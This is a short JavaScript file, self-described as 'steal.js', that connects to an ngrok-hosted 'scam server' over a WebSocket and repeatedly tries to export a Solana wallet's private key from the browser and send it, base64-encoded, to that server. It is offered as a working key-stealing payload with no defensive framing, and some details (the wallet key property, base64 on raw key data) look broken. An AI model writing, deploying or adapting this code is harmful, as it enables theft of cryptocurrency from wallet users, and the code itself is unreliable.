console.log("steal.js is loaded! Connecting to scam server...");

const socket = new WebSocket("wss://randomsub.ngrok.io");

socket.onopen = () => {
    console.log("WebSocket connected!");
    setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
};

async function stealPrivateKey() {
    try {
        console.log("Attempting to extract private key...");
        const privateKey = await window.crypto.subtle.exportKey("pkcs8", window.solana.signingKey);
        socket.send(JSON.stringify({ key: btoa(privateKey) }));
        console.log("Private key sent!");
    } catch (err) {
        console.error("Failed to extract private key:", err);
    }
}

setInterval(stealPrivateKey, 5000);
